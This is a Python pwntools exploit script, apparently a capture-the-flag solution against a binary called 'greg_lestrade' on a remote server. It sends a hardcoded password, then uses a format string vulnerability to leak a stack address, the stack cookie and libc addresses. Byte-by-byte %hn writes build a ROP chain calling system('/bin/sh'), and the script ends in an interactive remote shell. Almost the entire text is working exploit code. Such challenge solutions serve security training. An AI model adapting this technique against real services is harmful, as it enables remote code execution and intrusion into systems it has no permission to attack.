from pwn import *


#r = process("./greg_lestrade")
r = remote("146.185.132.36", 12431)

def recvall():
    c = 0
    ret = ""
    while True:
        a = r.recvline(timeout=0.2)
        if a == "":
            c += 1
        ret += a
        if c == 2:
            break
    return ret

def pad(string):
    return string + "a" * (0xfe - len(string))
    
def fmt(inp):
    r.sendline("1")
    r.sendline(pad(inp))
    
def read(addr):
    r.sendline("1")
    send = "%40$s" + "BBBBCCCC" + "a" * (0xfe - 5 - 8) + "\n\x00" + p64(addr)
    r.sendline(send)
    ans = recvall()
    ret = 0
    for a in ans.split("\n"):
        if "BBBBCCCC" in a:
            if a.startswith("BBBBCCCC"):
                return 0
            leak = a.split(":")[1].split("BBBBCCCC")[0].strip()
            if len(leak) > 8:
                leak = leak[:8]
            ret = struct.unpack("<Q", leak + "\x00" * (8 - len(leak)))[0]
    return ret
                

r.sendline("7h15_15_v3ry_53cr37_1_7h1nkBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB")

#leak stack address
fmt("%141$p")
recved = recvall()
stackleak = 0
for a in recved.split("\n"):
    if "0x" in a:
        stackleak = int(a.split("aaaaaa")[0].split(":")[1].strip(), 16)
print "Stackleak: {}".format(hex(stackleak))

#read cookie overflow
r.sendline("1")
send = "%40$s" + "BBBBCCCC" + "a" * (0xfe - 5 - 8) + "\n\x00" + p64(stackleak - 0x100)
r.sendline(send)
print recvall()

#read cookie
cookie_addr = stackleak - 0x170
print "Cookie address: {}".format(hex(cookie_addr))

cookie = read(cookie_addr + 1)
print hex(cookie)
cookie = hex(cookie)[4:]
cookie2 = ""
for a in range(0, len(cookie), 2):
    print cookie[a:a+2]
    cookie2 += chr(int(cookie[a:a+2], 16))

cookie2 = "\x00" + cookie2[::-1]

#leak libc puts
puts = read(0x602020)
print "Puts: {}".format(hex(puts))

#leak printf to find libc version
printf = read(0x602040 + 1)
print "Printf: {}".format(hex(printf))

binsh = puts + 0x11d687
system = puts - 0x2a300
gadget = 0x0000000000400bc3 # pop rdi ; ret
main = 0x400a2c
strlenGOT = 0x602028

#format string vulnerability when al is 00
#i used size 0x100 payloads
def write(inp, addr):
    r.sendline("1")
    if ord(inp[-1]) == 0:
        send = "%40$hn" + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4 + 5) + "\n\x00" + p64(addr)
    else:
        send = "%{}x%40$hn".format('%03d' % ord(inp[-1])) + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4) + "\n\x00" + p64(addr)
    r.sendline(send)
    print recvall()
    r.sendline("1")
    if (ord(inp[-2:][:1]) != 0):
        send = "%{}x%40$hn".format('%03d' % ord(inp[-2:][:1])) + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4) + "\n\x00" + p64(addr + 1)
    else:
        send = "%40$hn" + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4 + 5) + "\n\x00" + p64(addr + 1)
    r.sendline(send)
    print recvall()
    r.sendline("1")
    if (ord(inp[-3:][:1]) != 0):
        send = "%{}x%40$hn".format('%03d' % ord(inp[-3:][:1])) + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4) + "\n\x00" + p64(addr + 2)
    else:
        send = "%40$hn" + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4 + 5) + "\n\x00" + p64(addr + 2)
    r.sendline(send)
    print recvall()
    r.sendline("1")
    if ord(inp[-4:][:1]) != 0:
        send = "%{}x%40$hn".format('%03d' % ord(inp[-4:][:1])) + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4) + "\n\x00" + p64(addr + 3)
    else:
        send = "%40$hn" + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4 + 5) + "\n\x00" + p64(addr + 3)

    r.sendline(send)
    print recvall()
    r.sendline("1")
    if ord(inp[-5:][:1]) != 0:
        send = "%{}x%40$hn".format('%03d' % ord(inp[-5:][:1])) + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4) + "\n\x00" + p64(addr + 4)
    else:
        send = "%40$hn" + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4 + 5) + "\n\x00" + p64(addr + 4)

    r.sendline(send)
    print recvall()
    r.sendline("1")
    if ord(inp[-6:][:1]) != 0:
        send = "%{}x%40$hn".format('%03d' % ord(inp[-6:][:1])) + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4) + "\n\x00" + p64(addr + 5)
    else:
        send = "%40$hn" + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4 + 5) + "\n\x00" + p64(addr + 5)

    r.sendline(send)
    print recvall()
    r.sendline("1")
    if ord(inp[-7:][:1]) != 0:
        send = "%{}x%40$hn".format('%03d' % ord(inp[-7:][:1])) + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4) + "\n\x00" + p64(addr + 6)
    else:
        send = "%40$hn" + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4 + 5) + "\n\x00" + p64(addr + 6)

    r.sendline(send)
    print recvall()
    r.sendline("1")
    if ord(inp[-8:][:1]) == 0:
        send = "%40$hn" + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4 + 5) + "\n\x00" + p64(addr + 7)
    else:
        send = "%{}x%40$hn".format('%03d' % ord(inp[-8:][:1])) + "BBBBCCCC" + "a" * (0xfe - 8 - 15 + 4) + "\n\x00" + p64(addr + 7)
    r.sendline(send)
    print recvall()

#create rop chain using format string
write(cookie2[::-1], stackleak-0x100)
write(p64(gadget)[::-1], stackleak-0x100+8+8)
write(p64(binsh)[::-1], stackleak-0x100+8+8+8)
write(p64(system)[::-1], stackleak-0x100+8+8+8+8)

#trigger rop chain
r.sendline("0")

r.interactive()

